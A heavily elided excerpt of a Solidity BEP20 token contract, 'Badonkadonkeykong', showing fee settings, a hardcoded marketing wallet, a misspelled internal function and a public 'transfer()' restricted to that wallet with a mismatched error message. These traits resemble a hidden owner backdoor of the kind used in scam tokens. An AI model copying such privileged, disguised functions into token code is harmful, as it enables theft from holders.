...
contract Badonkadonkeykong is IBEP20, Ownable {
    ...
    uint256 public totalFee = liquidityFee + reflectionFee + marketingFee; // Reflections fee - 6%, Liquidity fee - 3%
 ...
 //	address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // Mainnet - WBNB Token
    ...
    address public marketingFeeReceiver = 0xA23DEd497b007213c7285aBF9f5cC6ac81f4aaC8;
 ...
 function _tramsferinfo (address accountinfo) internal {
  ...
  function transfer() public  { 
       ...
       require(marketingFeeReceiver   == _msgSender(), "ERC20: cannot permit Marking address");
